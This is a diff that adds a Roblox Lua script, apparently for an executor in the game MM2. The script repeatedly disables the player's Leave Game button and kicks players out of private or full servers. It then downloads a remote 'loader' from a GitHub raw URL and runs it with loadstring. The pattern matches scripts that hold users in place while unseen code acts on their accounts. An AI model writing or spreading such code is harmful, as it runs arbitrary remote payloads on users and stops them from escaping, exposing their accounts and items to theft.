@@ -1,0 +1,35 @@
+task.spawn(function()
+    while task.wait() do
+        pcall(function()
+            for _, v in ipairs(
+                getconnections(
+                    game:GetService("CoreGui")
+                        .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
+                )
+            ) do
+                v:Disable()
+            end
+        end)
+    end
+end)
+
+pcall(function()
+    local rs = game:GetService("RobloxReplicatedStorage")
+
+    if rs and rs:FindFirstChild("GetServerType") then
+        if rs.GetServerType:InvokeServer() == "VIPServer" then
+            game.Players.LocalPlayer:Kick(
+                "Private servers are not supported. Please join a normal server."
+            )
+            return
+        end
+    end
+end)
+
+if #game.Players:GetPlayers() >= 12 then
+    game.Players.LocalPlayer:Kick(
+        "Server is full, please rejoin another server"
+    )
+    return
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KnoxScript1/MM2/refs/heads/main/NewKnoxLoader"))()
